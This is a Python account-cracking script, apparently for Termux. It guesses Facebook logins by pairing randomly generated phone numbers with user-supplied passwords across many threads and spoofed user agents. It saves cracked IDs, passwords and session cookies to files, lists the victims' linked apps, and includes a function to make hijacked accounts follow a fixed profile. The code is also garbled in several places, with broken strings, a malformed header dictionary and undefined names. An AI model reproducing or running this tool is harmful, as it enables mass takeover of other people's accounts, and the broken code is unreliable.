import os
import sys
import time
import requests
import uuid
os.system('git pull')
os.system('pkg install curl')

class jalan:
    
    def __init__(self, z):
        pass


logo = '''\033[1;97m'

      _____   _    _     ___ __  __  
     |__  /  / \  | |   |_ _|  \/  | 
       / /  / _ \ | |    | || |\/| | 
      / /_ / ___ \| |___ | || |  | | 
     /____/_/   \_\_____|___|_|  |_| 
                                 
  033[1;91m' ----------------       ---      ------      ---     -------      '''
  [~] Author : Mohammad shahid
  [~] Facebook : Mohammad shahid
  [~] Tool : Free
  [~] Version : 0.1
  \033[1;37m--------------------------------------------------
  def linex():
	print('\033[1;37m----------------------------------------------')


def o():
    os.system('clear')
    jalan(logo)
    jalan('\tðŸ”¥ðŸ”¥RANDOM NUMBER CRACKðŸ”¥ðŸ”¥')
    print('')
    jalan('\x1b[1;32m [1]\x1b[1;33m RANDOM CRACK ')
    jalan(' \x1b[1;32m[00] \x1b[1;31mEXIT')
    opt = input('\n   \x1b[1;32m Choose option >>> ')
    if opt == '1':
        i()
    if None == '0':
        os.system('exit')
        return None
    None('\n\x1b[1;31m  Choose valid option\x1b[0;97m')


import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[ðŸŽ®] %s \x1b[1;95m â˜† Your Active Apps â˜†     :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[ðŸŽ®] %s \x1b[1;95m â—‡ Your Expired Apps â—‡    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')
 
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            
 
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
logo = ('''

      _____   _    _     ___ __  __  
     |__  /  / \  | |   |_ _|  \/  | 
       / /  / _ \ | |    | || |\/| | 
      / /_ / ___ \| |___ | || |  | | 
     /____/_/   \_\_____|___|_|  |_| 
                                 
                                 ''')
loop = 0.1
oks = []
cps = []
 
def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.3
    update = ('5.3')
    update = ('5.3')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)
 
#User agents
ugen2=[]
ugen=[]
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
# APK CHECK
def i():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    jalan(logo)
    
    
    jalan("\033[1;37m\t  USE OUR COUNTRY CODE  ")
    jalan('\033[1;36m     \t     PAK CODES\n     \033[1;33m92301, \033[1;33m92302 ,\033[1;33m92303 ,\033[1;33m92305  ...\033[0;97m')
    jalan('\033[1;32m---------------------------------------------')
    jalan('\033[1;36m     \t     INDIA CODES\n     \033[1;33m91778, \033[1;33m91930 ,\033[1;33m91902 ,\033[1;33m91712  ...\033[0;97m')
    jalan('\033[1;32m---------------------------------------------')
    jalan('\033[1;36m     \t     BD CODES\n     \033[1;33m88016, \033[1;33m88017 ,\033[1;33m88018 ,\033[1;33m88019  ...\033[0;97m')
    jalan('\033[1;32m---------------------------------------------\n')
    code = input(' PUT CODE : ')
    print("")
    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = int(input("[*] Enter Password Limit : "))
    HamiiID = []
    print("")
    for bilal in range(passx):
        pww = input("[*] Enter Password : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print('\033[1;36m TOTAL IDS: '+tl)
        print('\033[1;36m THE PROCESS HAS BEEN STARTED')
        print('\033[1;31m USE AEROPLANE MOOD IN EVERY 4 MIN ')
        print('\033[1;32m---------------------------------------------')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
            manshera.submit(rcrack,uid,pwx,tl)
    print('\033[1;32m---------------------------------------------')
                   
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    print('\033[1;32m---------------------------------------------')
 
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            mbasic_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(mbasic_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(mbasic_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(mbasic_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(mbasic_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
    headers = {
    'authority': 'p.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=y2bcZCfvfNMM4-hmbDrhToSw; sb=y2bcZHrOi125LqENazZBu1p0; m_pixel_ratio=2.75; x-referer=eyJyIjoiL2Vycm9yL2luZGV4LnBocD9lcnI9ZWMma2Vycj0xMzU3MDMyJmtlcnJfc3VtbWFyeT1Tb21ldGhpbmclMjB3ZW50JTIwd3Jvbmcma2Vycl9kZXNjcmlwdGlvbj1QbGVhc2UlMjB0cnklMjByZWZyZXNoaW5nJTIwdGhlJTIwUGFnZSUyMG9yJTIwY2xvc2luZyUyMGFuZCUyMHJlb3BlbmluZyUyMHlvdXIlMjBicm93c2VyJTIwd2luZG93LiIsImgiOiIvZXJyb3IvaW5kZXgucGhwP2Vycj1lYyZrZXJyPTEzNTcwMzIma2Vycl9zdW1tYXJ5PVNvbWV0aGluZyUyMHdlbnQlMjB3cm9uZyZrZXJyX2Rlc2NyaXB0aW9uPVBsZWFzZSUyMHRyeSUyMHJlZnJlc2hpbmclMjB0aGUlMjBQYWdlJTIwb3IlMjBjbG9zaW5nJTIwYW5kJTIwcmVvcGVuaW5nJTIweW91ciUyMGJyb3dzZXIlMjB3aW5kb3cuIiwicyI6Im0ifQ%3D%3D; locale=en_GB; wl_cbv=v2%3Bclient_version%3A2305%3Btimestamp%3A1692166004; vpd=v1%3B768x393x2.75; wd=393x768; fr=0qIta4HT79DhtENtk.AWV5YYG4PWomXtxRRww0ifLR5YE.Bk3GbL.kp.AAA.0.0.Bk3Gvd.AWXsyTOELTw',
    'dpr': '2.75',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.70"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"V2127"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36','viewport-width': '980',}': pro,}
            lo = session.post( 'https://mbasic.facebook.com/login/save-device/?login_source=login&wtsid=rdr_1GArbEa097Y8Q2vVF&refsrc=deprecated&_rdr',data=log_data,headers=header_mbasicfb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('    \033[1;32m(ZALIM-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/ZALIM-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(ZALIM-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/ZALIM-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[ZALIM] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
 
o()
 
